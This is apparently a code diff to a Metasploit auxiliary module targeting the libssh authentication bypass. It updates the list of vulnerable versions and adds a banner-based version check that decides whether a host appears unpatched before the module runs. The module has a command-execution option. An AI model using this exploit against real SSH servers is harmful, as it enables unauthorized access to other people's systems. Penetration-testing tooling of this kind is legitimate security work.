@@ -16,7 +16,8 @@ class MetasploitModule < Msf::Auxiliary
       'Description'    => %q{
         This module exploits an authentication bypass in libssh server code
         where a USERAUTH_SUCCESS message is sent in place of the expected
-        USERAUTH_REQUEST message. Versions 0.6 and later are affected.
+        USERAUTH_REQUEST message. libssh versions 0.6.0 through 0.7.5 and
+        0.8.0 through 0.8.3 are vulnerable.
 
         Note that this module's success depends on whether the server code
         can trigger the correct (shell/exec) callbacks despite only the state
@@ -41,13 +42,33 @@ class MetasploitModule < Msf::Auxiliary
       Opt::RPORT(22),
       OptString.new('CMD',        [false, 'Command to execute']),
       OptBool.new('SPAWN_PTY',    [false, 'Spawn a PTY', false]),
-      OptBool.new('CHECK_BANNER', [false, 'Check banner for "libssh"', true])
+      OptBool.new('CHECK_BANNER', [false, 'Check banner for libssh', true])
     ])
 
     register_advanced_options([
       OptBool.new('SSH_DEBUG',  [false, 'SSH debugging', false]),
       OptInt.new('SSH_TIMEOUT', [false, 'SSH timeout', 10])
     ])
+  end
+
+  # Vulnerable since 0.6.0 and patched in 0.7.6 and 0.8.4
+  def check_banner(ip, version)
+    version =~ /libssh_([\d.]+)$/ && $1 && (v = Gem::Version.new($1))
+
+    if v.nil?
+      vprint_error("#{ip}:#{rport} - #{version} does not appear to be libssh")
+      return Exploit::CheckCode::Safe
+    elsif v.between?(Gem::Version.new('0.6.0'), Gem::Version.new('0.7.5')) ||
+          v.between?(Gem::Version.new('0.8.0'), Gem::Version.new('0.8.3'))
+      vprint_good("#{ip}:#{rport} - #{version} appears to be unpatched")
+      return Exploit::CheckCode::Appears
+    else
+      vprint_error("#{ip}:#{rport} - #{version} appears to be patched")
+      return Exploit::CheckCode::Safe
+    end
+
+    # Hopefully we never hit this
+    Exploit::CheckCode::Unknown
   end
 
   def run_host(ip)
@@ -83,10 +104,8 @@ class MetasploitModule < Msf::Auxiliary
     version = ssh.transport.server_version.version
 
     # XXX: The OOB authentication leads to false positives, so check banner
-    if datastore['CHECK_BANNER'] && !version.include?('libssh')
-      print_error("#{ip}:#{rport} - #{version} does not appear to be libssh")
-      return
-    end
+    return if datastore['CHECK_BANNER'] &&
+              check_banner(ip, version) != Exploit::CheckCode::Appears
 
     report_vuln(
       host: ip,
